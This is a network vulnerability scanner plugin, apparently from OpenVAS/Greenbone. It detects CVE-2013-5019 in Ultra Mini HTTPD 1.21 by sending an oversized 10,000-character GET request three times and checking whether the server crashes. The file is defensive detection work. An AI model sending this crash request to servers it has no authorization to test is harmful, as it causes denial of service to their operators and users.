if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803721" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2013-5019" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-07-16 11:19:36 +0530 (Tue, 16 Jul 2013)" );
	script_name( "Ultra Mini HTTPD Stack Buffer Overflow Vulnerability" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause
  the application to crash, creating a denial-of-service condition." );
	script_tag( name: "vuldetect", value: "Send a large crafted data via HTTP GET request and check
  the server is crashed or not." );
	script_tag( name: "affected", value: "Ultra Mini HTTPD server Version 1.21." );
	script_tag( name: "insight", value: "The flaw is due to an error when processing certain long requests and can be
  exploited to cause a denial of service via a specially crafted packet." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Ultra Mini HTTPD server and is prone to stack based buffer
  overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/26739/" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/windows/ultra-mini-httpd-121-stack-buffer-overflow" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
res = http_get_cache( item: "/index.html", port: port );
if(!res || !ContainsString( res, ">Ultra Mini Httpd" )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = http_get( item: NASLString( "A", crap( 10000 ) ), port: port );
for(i = 0;i < 3;i++){
	http_send_recv( port: port, data: req );
}
req = http_get( item: "/index.html", port: port );
res = http_send_recv( port: port, data: req );
if(!res || !ContainsString( res, ">Ultra Mini Httpd" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

